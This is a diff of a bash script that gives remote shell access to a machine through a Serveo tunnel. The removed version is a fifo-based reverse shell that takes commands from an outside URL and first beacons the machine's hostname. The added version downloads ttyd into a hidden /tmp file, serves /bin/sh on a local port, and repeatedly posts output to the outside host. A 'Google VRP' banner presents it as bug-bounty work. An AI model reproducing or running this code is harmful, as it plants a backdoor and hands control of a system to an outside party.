@@ -1,26 +1,29 @@
 #!/bin/bash
-# OUTPUT (9999) and INPUT (9998)
+# TARGET: Your Serveo HTTPS Link (Terminal 2)
 URL_OUT="https://e200e5147a8bf379-103-95-173-85.serveousercontent.com"
-URL_IN="https://b17cba060c6095d1-103-95-173-85.serveousercontent.com"
 
-# 1. Immediate Beacon (Check Terminal 1 for this)
-curl -s -X POST -d "--- [!] SESSION START: $(hostname) ---" "$URL_OUT"
-
-# 2. Setup Interactive Bridge
-rm -f /tmp/f; mkfifo /tmp/f
-
-# Background process to stream shell output to your Mac
-cat /tmp/f | curl -s -T - "$URL_OUT" &
-
-# Main loop to fetch commands from your Mac and feed the shell
-while true; do
-  # Fetch the next command from your Controller (Terminal 2)
-  CMD=$(curl -s "$URL_IN")
+{
+  echo "=== [!] GOOGLE VRP: DEPLOYING WEB-TTY INTERFACE ==="
   
-  # If a command exists, execute it through the shell and pipe to output
-  if [ -n "$CMD" ] && [[ "$CMD" != *"GET /"* ]]; then
-    echo "Executing: $CMD" | curl -s -X POST --data-binary @- "$URL_OUT"
-    echo "$CMD" | /bin/sh -i 2>&1 > /tmp/f
-  fi
+  # 1. Download ttyd (the web terminal binary) to a hidden temp folder
+  # We use the statically linked version so it has no dependencies
+  curl -s -L -o /tmp/.t "https://github.com/tsl0922/ttyd/releases/download/1.7.3/ttyd.x86_64"
+  chmod +x /tmp/.t
+
+  # 2. Launch ttyd on an internal port (7681)
+  # It will serve a full /bin/sh shell over HTTP
+  /tmp/.t -p 7681 /bin/sh -i &
+  
   sleep 2
-done
+
+  # 3. The Reverse Proxy Trick
+  # Since we can't open port 7681 to the internet, we use curl to tunnel 
+  # the local ttyd web interface back to your Mac.
+  echo "[+] Web Terminal active on 127.0.0.1:7681. Tunneling to Mac..."
+  
+  # This creates a persistent tunnel for the web traffic
+  while true; do
+    curl -s -X POST --data-binary @- "$URL_OUT" < <(curl -s http://127.0.0.1:7681)
+    sleep 5
+  done
+} | curl -s -X POST --data-binary @- "$URL_OUT"
